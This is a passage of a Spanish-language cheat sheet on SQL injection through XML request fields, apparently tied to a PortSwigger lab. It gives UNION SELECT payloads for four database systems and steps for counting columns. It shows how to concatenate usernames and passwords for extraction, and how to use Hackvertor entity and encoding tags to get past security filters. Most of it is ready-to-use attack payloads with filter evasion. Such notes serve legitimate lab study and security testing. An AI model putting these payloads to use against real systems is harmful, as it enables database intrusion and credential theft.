- **Función:** Convierte caracteres como (espacio), `'`, o `--` en entidades hexadecimales XML (ej. `&#x20;`). El analizador XML del servidor decodifica estas entidades _después_ de pasar el filtro de seguridad, pero _antes_ de ejecutar la consulta SQL.
    
## 2. Sintaxis de Extracción por SGBD (Vía XML)

Dado que estás inyectando en un campo numérico o de texto dentro de una etiqueta (como `<storeId>`), usaremos `UNION SELECT` para extraer datos.

### A. Estructuras de Unión con Hex Entities

|**SGBD**|**Payload de Extracción (dentro de @hex_entities)**|
|---|---|
|**PostgreSQL**|`1 UNION SELECT CAST(table_name AS text) FROM information_schema.tables LIMIT 1 OFFSET 0--`|
|**MySQL**|`1 UNION SELECT table_name FROM information_schema.tables LIMIT 0,1--`|
|**MS SQL**|`1 UNION SELECT TOP 1 name FROM sysobjects WHERE xtype='U'--`|
|**Oracle**|`1 UNION SELECT table_name FROM all_tables WHERE ROWNUM=1--`|

## 3. Pasos para la Explotación Avanzada

Para extraer datos completos (tablas, columnas y registros) usando tu estructura de `stockCheck`:

### Paso 1: Determinar el número de columnas

Debes probar cuántas columnas tiene la consulta original para que el UNION no falle.

3 <@hex_entities>UNION SELECT NULL--</@hex_entities>

(Sigue añadiendo NULLs hasta que la respuesta sea 200 OK).

### Paso 2: Extraer nombres de tablas (Ejemplo PostgreSQL)

Utiliza la lógica de iteración que vimos antes:

XML

```
<storeId>
  <@hex_entities>
    1 UNION SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET 0--
  </@hex_entities>
</storeId>
```

### Paso 3: Extraer Datos (Concatenación)

Si quieres sacar usuario y contraseña en una sola etiqueta:

| SGBD       | Sintaxis de Concatenación         |
| ---------- | --------------------------------- |
| PostgreSQL | `username \|\| ':' \|\| password` |
| MySQL      | `CONCAT(username, ':', password)` |
| MS SQL     | ` username + ':' + password`      |
| Oracle     | `username \|\| ':' \|\| password` |

## 4. Tabla de payloads para Hackvertor (Evasión)

Si `hex_entities` es detectado, Hackvertor tiene otras opciones de codificación dentro de las etiquetas XML:

|**Tag de Hackvertor**|**Uso recomendado**|
|---|---|
|`<@hex_entities>`|Ideal para saltar filtros básicos de caracteres especiales.|
|`<@dec_entities>`|Similar a hex, pero usa formato decimal (`&#32;`).|
|`<@urlencode>`|Si el XML se envía dentro de un parámetro URL.|
|`<@base64>`|Solo si el backend decodifica Base64 antes de procesar el XML.|

### 💡 Tips de Auditoría para XML SQLi

1. **Tipos de datos:** Si la columna donde inyectas es un número (como `storeId`), asegúrate de que el dato que extraes sea compatible o usa `CAST(dato AS text)`.
    
2. **No-Error:** Si no recibes error pero tampoco el dato, el servidor puede estar devolviendo solo el primer resultado. Asegúrate de que el `productId` o `storeId` original **no exista** (ej. poner `-1`) para forzar que el resultado del `UNION` sea el que se muestre.
    
3. **Comentarios:** En XML, a veces el `--` del SQL puede entrar en conflicto con comentarios XML. Si falla, prueba con `/*` o simplemente cierra la etiqueta correctamente.

---
# Referencias

Cheat Sheet de Burpsuite: [Enlace](https://portswigger.net/web-security/sql-injection/cheat-sheet)